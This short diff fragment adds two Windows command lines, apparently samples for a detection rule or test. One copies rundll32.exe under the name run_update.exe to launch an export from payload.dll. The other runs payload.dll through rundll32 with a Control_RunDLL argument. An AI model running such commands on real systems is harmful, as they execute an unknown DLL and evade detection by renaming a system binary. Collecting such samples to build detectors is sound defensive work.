@@ -1,0 +1,2 @@
+copy rundll32.exe run_update.exe && run_update.exe payload.dll,SpawnExplorer
+rundll32.exe payload.dll,EntryPoint "\shell32.dll,Control_RunDLL"
